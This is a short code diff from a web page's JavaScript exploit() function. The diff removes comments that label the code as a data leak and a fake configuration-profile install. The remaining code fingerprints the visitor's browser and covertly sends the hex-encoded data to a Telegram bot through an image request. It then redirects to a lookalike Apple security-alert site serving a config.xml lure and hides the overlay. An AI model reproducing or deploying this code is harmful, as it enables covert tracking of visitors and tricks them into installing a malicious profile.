@@ -20,7 +20,7 @@
         const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
 
         function exploit() {
-            // 1. Instant Data Leak (Browser Fingerprint & Header Leak)
+            
             let leak = {
                 mem: navigator.deviceMemory,
                 con: navigator.connection ? navigator.connection.effectiveType : 'unknown',
@@ -31,11 +31,10 @@
             
             new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🚀_EXPLOIT_INIT_${h(JSON.stringify(leak))}`;
 
-            // 2. The "Installation" Attempt (Fake Configuration Profile)
-            // Ye button ke piche hidden hai, click karte hi browser escape ki koshish karega
+            
             window.location.href = "https://applesecurityalert6-prog.github.io/config.xml"; 
 
-            // 3. UI Cleanup
+            
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('r').style.filter = 'none';
         }
